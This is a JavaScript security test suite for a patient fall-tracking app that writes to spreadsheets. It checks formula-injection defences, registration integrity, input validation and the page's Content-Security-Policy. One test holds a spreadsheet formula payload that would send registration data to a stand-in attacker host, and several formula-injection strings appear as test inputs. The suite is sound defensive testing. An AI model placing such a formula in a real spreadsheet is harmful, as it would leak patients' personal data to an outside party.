var fs = require('fs');
var path = require('path');
var core = require(path.join(__dirname, '..', 'app-core.js'));
var helpers = require('./helpers');
var fake = require('./fake_backend');

var root = path.join(__dirname, '..');
var page = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
var ui = fs.readFileSync(path.join(root, 'app-ui.js'), 'utf8');

function daysAgo(n) { return fake.bangkokDate(new Date(Date.now() - n * 86400000)); }

/** A synthetic patient on a phone of their own, registered through the real script. */
function patient(b, hn, extra) {
  var key = fake.deviceKey();
  var reg = Object.assign({
    token: b.token, schemaVersion: core.PROTOCOL_VERSION, patientId: hn, hn: hn, yearOfBirth: 1952,
    age: new Date().getUTCFullYear() - 1952, sex: 'female', consent: true, consentVersion: core.PDPA_NOTICE_VERSION,
    consentAt: new Date().toISOString(), consentLang: 'th', deviceKey: key
  }, extra);
  var registered = b.post(reg);
  return {
    key: key, reg: reg, registered: registered,
    post: function (record) {
      return b.post(Object.assign({ token: b.token, schemaVersion: core.PROTOCOL_VERSION, patientId: hn, deviceKey: key }, record));
    }
  };
}

function formulaCells(b) {
  var found = [];
  Object.keys(b.sheets).forEach(function (name) {
    b.sheets[name].rows.forEach(function (r, i) {
      r.forEach(function (cell) { if (cell.formula) found.push(name + ' row ' + (i + 1) + ': ' + cell.formula); });
    });
  });
  return found;
}

function run() {
  var cases = [];

  cases.push({
    name: 'text that would be a formula is stored as text, never run',
    fn: function () {
      var b = fake.backend();
      var a = patient(b, 'TEST-0001');
      helpers.assert(a.registered.ok, 'registration refused: ' + a.registered.error);
      var attack = '=IMAGE("https://attacker.example/?"&JOIN(",",Registrations!B:B))';
      ['=1+1', '+SUM(A1)', '-2+3', '@A1', attack, '\t=1'].forEach(function (cause, i) {
        var r = a.post({ date: daysAgo(i + 1), type: 'falls', injured: 0, cause: cause });
        helpers.assert(r.ok, 'fall ' + i + ' refused: ' + r.error);
      });
      helpers.assertEqual(formulaCells(b).join(' | '), '', 'a formula reached the sheet');
      var causes = b.sheets.Falls.rows.slice(1).map(function (r) { return r[3].text; });
      helpers.assert(causes.indexOf(attack) !== -1, 'the text itself should still be kept, as text');
    }
  });

  cases.push({
    name: 'a new version re-writes the kept cells safely too',
    fn: function () {
      var b = fake.backend();
      var a = patient(b, 'TEST-0001');
      a.post({ date: daysAgo(1), type: 'checkin', heightCm: 158 });
      // Stored text reads back without its apostrophe; copying it forward raw would make a formula.
      b.sheets.CheckIns.rows[1][3] = { text: '=HYPERLINK("x")' };
      helpers.assert(a.post({ date: daysAgo(1), type: 'checkin', tugSeconds: 11 }).ok, 'second version refused');
      helpers.assertEqual(formulaCells(b).join(' | '), '', 'the new version turned stored text into a formula');
    }
  });

  cases.push({
    name: 'a registration is never overwritten, by the same phone or another',
    fn: function () {
      var b = fake.backend();
      var a = patient(b, 'TEST-0001');
      helpers.assertEqual(a.registered.result.action, 'inserted', 'first registration');
      helpers.assertEqual(b.post(a.reg).result.action, 'duplicate_skipped', 'identical repeat');
      var changed = b.post(Object.assign({}, a.reg, { sex: 'male' }));
      helpers.assertEqual(changed.result.action, 'corrected', 'a changed registration from the same phone');
      var stranger = patient(b, 'TEST-0001', { sex: 'male', yearOfBirth: 1990, age: new Date().getUTCFullYear() - 1990 });
      helpers.assertEqual(stranger.registered.error, 'hn registered on another device');
      var rows = b.table('Registrations');
      helpers.assertEqual(rows.length, 2, 'two versions from the registered phone, nothing from the other');
      helpers.assertEqual(rows[0].sex, 'female', 'the first registration must be untouched');
      helpers.assertEqual(rows[1].supersedes, rows[0].receiptId, 'the correction names what it supersedes');
      helpers.assertEqual(b.overwrites.length, 0, 'no row was written over');
    }
  });

  cases.push({
    name: 'bad requests are refused before anything is written',
    fn: function () {
      var b = fake.backend();
      var key = fake.deviceKey();
      var good = { token: b.token, schemaVersion: core.PROTOCOL_VERSION, patientId: '4405123', deviceKey: key, date: daysAgo(1), type: 'falls', injured: 0 };
      [
        [Object.assign({}, good, { token: 'wrong' }), 'token'],
        [Object.assign({}, good, { patientId: '=1+1' }), 'patientId'],
        [Object.assign({}, good, { patientId: 'a b' }), 'patientId'],
        [Object.assign({}, good, { patientId: '123456789012345678901' }), 'patientId'],
        [Object.assign({}, good, { patientId: { a: 1 } }), 'patientId'],
        [Object.assign({}, good, { date: '=NOW()' }), 'date'],
        [Object.assign({}, good, { type: 'Registrations' }), 'record type'],
        [Object.assign({}, good, { type: 'Audit' }), 'record type'],
        [Object.assign({}, good, { deviceKey: 'short' }), 'app update required'],
        [{ token: b.token, patientId: '4405123' }, 'app update required']
      ].forEach(function (pair) {
        var r = b.post(pair[0]);
        helpers.assert(!r.ok && r.error.indexOf(pair[1]) !== -1, 'expected a refusal about ' + pair[1] + ', got ' + JSON.stringify(r));
      });
      helpers.assert(!b.post('{"token":"' + b.token + '","x":"' + new Array(30000).join('a') + '"}').ok, 'an oversized body must be refused');
      helpers.assertEqual(b.post('{"token":').error, 'invalid request', 'a body that is not JSON');
      helpers.assertEqual(b.post('[1,2]').error, 'invalid request', 'a body that is not an object');
      helpers.assertEqual(Object.keys(b.sheets).length, 0, 'nothing should have been written');
    }
  });

  cases.push({
    name: 'free text is capped, and a value of the wrong kind is refused',
    fn: function () {
      var b = fake.backend();
      var a = patient(b, 'TEST-0001');
      helpers.assertEqual(a.post({ date: daysAgo(1), type: 'falls', injured: 0, cause: new Array(202).join('x') }).error, 'invalid cause');
      helpers.assertEqual(a.post({ date: daysAgo(2), type: 'falls', injured: { evil: true } }).error, 'invalid injured');
      helpers.assertEqual(a.post({ date: daysAgo(3), type: 'falls', injured: 0, cause: ['a'] }).error, 'invalid cause');
      helpers.assertEqual(b.table('Falls').length, 0, 'none of them was written');
      // safeCell still caps and strips whatever does reach it.
      helpers.assertEqual(b.ctx.safeCell(new Array(1000).join('x')).length, 200);
      helpers.assertEqual(b.ctx.safeCell({ evil: true }), '');
    }
  });

  cases.push({
    name: 'the app refuses an HN that could start a formula',
    fn: function () {
      ['4405123', '12-3456', 'AB/123'].forEach(function (hn) { helpers.assert(core.isValidHn(hn), hn + ' should be accepted'); });
      ['=1+1', '-5', '+5', '@x', '1 2', '', '123456789012345678901'].forEach(function (hn) {
        helpers.assert(!core.isValidHn(hn), JSON.stringify(hn) + ' should be refused');
      });
      helpers.assert(/C\.isValidHn\(hn\)/.test(ui), 'registration does not check the HN');
      helpers.assert(/id="hnInput"[^>]*maxlength="20"/.test(ui), 'the HN field has no length cap');
      helpers.assert(/id="fallCause"[^>]*maxlength="200"/.test(ui) && /id="checkinFallCause"[^>]*maxlength="200"/.test(ui), 'fall cause fields have no length cap');
    }
  });

  cases.push({
    name: 'the page runs only its own scripts',
    fn: function () {
      var csp = (page.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1];
      helpers.assert(csp, 'no Content-Security-Policy');
      var scriptSrc = (csp.match(/script-src ([^;]+)/) || [])[1] || '';
      helpers.assertEqual(scriptSrc.trim(), "'self'", 'script-src must be self only');
      ["object-src 'none'", "base-uri 'none'", 'connect-src', 'https://script.google.com', 'https://script.googleusercontent.com'].forEach(function (d) {
        helpers.assert(csp.indexOf(d) !== -1, 'CSP is missing ' + d);
      });
      helpers.assert(!/<script>[\s\S]*?\S[\s\S]*?<\/script>/.test(page), 'index.html has an inline script, which the CSP would block');
      helpers.assert(!/\son[a-z]+="/.test(page) && !/\son[a-z]+=\\?"/.test(ui), 'an inline event handler would be blocked by the CSP');
      helpers.assert(/'\.\/app-ui\.js'/.test(fs.readFileSync(path.join(root, 'sw.js'), 'utf8')), 'the service worker does not cache app-ui.js');
    }
  });

  cases.push({
    name: 'numbers drawn into charts are escaped like everything else',
    fn: function () {
      helpers.assert(/esc\(p\.value\)/.test(ui), 'chart value labels are written without esc()');
    }
  });

  return helpers.runSuite('t19_security', cases);
}

module.exports = run;

if (require.main === module) {
  helpers.report(run());
}
